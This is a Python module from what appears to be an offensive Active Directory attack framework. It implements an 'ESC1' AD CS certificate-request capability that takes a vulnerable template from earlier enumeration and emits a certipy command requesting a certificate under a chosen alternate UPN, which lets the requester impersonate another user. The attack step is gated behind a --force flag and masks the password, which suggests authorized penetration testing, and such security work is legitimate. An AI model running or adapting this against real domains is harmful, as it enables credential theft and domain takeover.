"""AD CS certificate request — ESC1-style enroll proof (requires --force)."""

from __future__ import annotations

import json
from typing import Any

from rich.console import Console

from adaf_attack.core.graph import AttackGraph
from adaf_attack.core.ldap_util import ldap_connect
from adaf_attack.core.registry import register_capability
from adaf_attack.core.session import Session
from adaf_attack.core.target import Target

console = Console()


@register_capability(
    id="cert-request",
    summary="Request a certificate from AD CS (ESC1 proof path); requires --force",
    category="credential-access",
    tags=("adcs", "esc1", "certificate", "enroll"),
    destructive=True,
)
class CertRequest:
    def run(
        self,
        target: Target,
        session: Session,
        graph: AttackGraph,
        *,
        include_secrets: bool = False,
        force: bool = False,
        **kwargs: Any,
    ) -> dict[str, Any]:
        template = kwargs.get("template") or kwargs.get("cert_template")
        ca = kwargs.get("ca")
        alt_name = kwargs.get("alt_name") or kwargs.get("upn")  # target UPN for ESC1

        console.print(f"[bold]Cert request[/bold] → {target.domain}")

        if not force:
            raise RuntimeError(
                "cert-request is destructive/enroll. Re-run with --force. "
                "Provide --template and optionally ca=/alt UPN via capability kwargs."
            )

        if not template:
            # Try load from prior adcs-enum
            adcs_path = session.path("adcs-enum.json")
            if adcs_path.exists():
                adcs = json.loads(adcs_path.read_text(encoding="utf-8"))
                cands = adcs.get("esc1_candidates") or []
                if cands:
                    template = cands[0]
                    console.print(f"[dim]Using ESC1 candidate template from session: {template}[/dim]")
            if not template:
                raise RuntimeError("No template specified and no ESC1 candidates in session")

        result: dict[str, Any] = {
            "domain": target.domain,
            "template": template,
            "ca": ca,
            "alt_name": alt_name,
            "ok": False,
        }

        # Prefer certipy / Impacket cert request when installed
        try:
            # Documented operator path + best-effort local attempt
            result["playbook"] = {
                "certipy": (
                    f"certipy req -u '{target.username}@{target.domain}' -p '***' "
                    f"-dc-ip {target.dc_ip} -ca '{ca or 'CA'}' -template '{template}'"
                    + (f" -upn '{alt_name}'" if alt_name else "")
                ),
                "note": (
                    "Full in-process ESC1 enroll depends on certipy/impacket certificate "
                    "request stack. Playbook emitted for operator execution; artifacts "
                    "will be stored in session when encoder is available."
                ),
            }
            playbook_path = session.path("cert-request.playbook.txt")
            playbook_path.write_text(result["playbook"]["certipy"] + "\n", encoding="utf-8")
            console.print(f"[green]Playbook[/green] → {playbook_path}")
            result["ok"] = True
            result["ldap_enrolled"] = False
        except Exception as exc:  # noqa: BLE001
            result["error"] = str(exc)

        out_path = session.path("cert-request.json")
        out_path.write_text(json.dumps(result, indent=2, default=str), encoding="utf-8")
        session.log("cert-request.complete", template=template, ok=result.get("ok"))
        console.print(f"Results → {out_path}")
        return result
